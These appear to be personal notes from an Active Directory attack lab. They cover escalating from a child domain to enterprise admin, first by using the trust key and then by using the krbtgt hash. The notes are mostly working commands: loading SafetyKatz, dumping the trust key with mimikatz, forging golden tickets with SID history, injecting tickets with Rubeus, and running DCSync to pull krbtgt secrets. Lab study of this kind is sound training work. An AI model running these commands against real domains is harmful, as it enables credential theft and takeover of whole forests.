*Using the trust key*
First you need the trust key
```cmd
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```
Extract the key
```mimikatz
lsadump::trust /patch
```
![[Pasted image 20231113153820.png]]
Now you can frge a ticket with SID History of Enterprise Admins.Use BetterSafeyKatz
```BetterSafetyKatz
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<CURRENT DOMAIN> /sid:<CURRENT DOMAIN SID> /sids:<SID TO EXTRACT> /rc4:<TRUST KEY> /service:krbtgt /target:<TARGET DOMAIN> /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
```
![[Pasted image 20231113155053.png]]
Now use rubeus to use the ticket and get access on mcorp-dc
```cmd
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/<TARGET MACHINE> /dc:<TARGET MACHINE> /ptt
```
![[Pasted image 20231113155312.png]]
Test it
![[Pasted image 20231113155355.png]]
*Using the krbTGT account*
With the hash of krbtgt account from dcorp-dc we can create an inter-realm TGT and inject. Using Rubeus
```Rubeus
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<CURRENT DOMAIN> /sid:<CURRENT DOMAIN SID> /sids:<SID TO EXTRACT> /krbtgt:<KRBTGT HASH> /ptt" "exit"
```
![[Pasted image 20231113161101.png]]
Test it
![[Pasted image 20231113161326.png]]
Now we can also run a DC-Sync against mcorp-dc to extract the his secrets
```cmd
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<TARGET DOMAIN>" "exit"
```